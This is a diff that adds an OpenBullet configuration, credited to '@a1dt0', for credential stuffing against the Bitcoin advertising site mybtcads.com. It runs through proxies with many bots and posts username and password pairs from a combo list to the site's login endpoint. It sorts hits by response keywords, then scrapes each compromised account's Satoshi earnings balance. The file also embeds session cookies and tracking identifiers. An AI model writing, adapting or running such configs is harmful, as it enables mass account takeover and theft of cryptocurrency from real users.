@@ -1,0 +1,85 @@
+[SETTINGS]
+{
+  "Name": "mybtcads.com_adt💔",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-28T04:45:29.7081917+00:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "a1dt0",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://mybtcads.com/inc/loginto.php" 
+  CONTENT "mail=<USER>&thepassword=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: mybtcads.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Content-Length: 47" 
+  HEADER "Origin: https://mybtcads.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://mybtcads.com/login.php" 
+  HEADER "Cookie: PHPSESSID=0299774660a54f1840add6a6cac586f9; _ga=GA1.2.2069793062.1648434562; _gid=GA1.2.2085680294.1648434562; TawkConnectionTime=0; twk_idm_key=Sd_1ZeEGYa69R8eKkbRGU; twk_uuid_6116619f649e0a0a5cd0fa17={\"uuid\":\"1.H3MZsKNEkoBdJhx07o51BjcDNl2yWX9vuRpuwfeJWFGDieotm909xtsIFu4JmDAh6Op0uAhHSDJR3VqpX21kf27zWXQIlH5maCEXXXWPtPE5n3A5NIowt3YufnUwTybp2P4j818dm2w40dai\",\"version\":3,\"domain\":\"mybtcads.com\",\"ts\":1648441253376}" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "TE: trailers" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "usernamenot" 
+    KEY "nothing" 
+  KEYCHAIN Success OR 
+    KEY "66476" 
+
+#Info REQUEST GET "https://mybtcads.com/convertsat.php" 
+  
+  HEADER "Host: mybtcads.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://mybtcads.com/login.php" 
+  HEADER "Cookie: PHPSESSID=0299774660a54f1840add6a6cac586f9; _ga=GA1.2.2069793062.1648434562; _gid=GA1.2.2085680294.1648434562; TawkConnectionTime=0; twk_idm_key=Sd_1ZeEGYa69R8eKkbRGU; twk_uuid_6116619f649e0a0a5cd0fa17={\"uuid\":\"1.H3MZsKNEkoBdJhx07o51BjcDNl2yWX9vuRpuwfeJWFGDieotm909xtsIFu4JmDAh6Op0uAhHSDJR3VqpX21kf27zWXQIlH5maCEXXXWPtPE5n3A5NIowt3YufnUwTybp2P4j818dm2w40dai\",\"version\":3,\"domain\":\"mybtcads.com\",\"ts\":1648441253376}" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "TE: trailers" 
+
+#Earnings_Balance_Satoshi PARSE "<SOURCE>" LR "badge-pill mt-0 ml-1 pl-2 pr-2 d-lg-block d-md-none float-left\">" "Satoshi" CreateEmpty=FALSE -> CAP "Earnings Balance" "Satoshi " "" 
+
+FUNCTION Constant "@OpenBulletHub" -> CAP "Config by @a1dt0" 
+
